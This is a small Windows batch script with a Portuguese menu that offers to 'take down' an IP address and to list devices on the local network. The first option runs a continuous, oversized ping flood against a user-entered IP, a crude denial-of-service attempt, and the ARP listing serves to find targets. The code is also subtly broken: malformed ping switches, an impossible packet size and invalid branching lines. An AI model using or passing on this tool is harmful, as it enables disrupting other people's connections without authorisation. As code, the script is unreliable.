@echo off

goto menu

:menu

echo "Derrubar ip 1"
echo "Ver pessoas na rede 2"
echo "Sair 3"
choice /n /C:123

if %ERRORLEVEL% == 1 cls goto d
if %ERRORLEVEL% ==2 cls goto v
if %ERRORLEVEL% ==3 cls  goto sair


:d
set /p "ip=Digite ip:"
ping -f-l10000000 -t %ip%
REM pause > nul
REM goto menu

:v
arp -a
pause > nul

goto menu

:sair
pause > nul
cls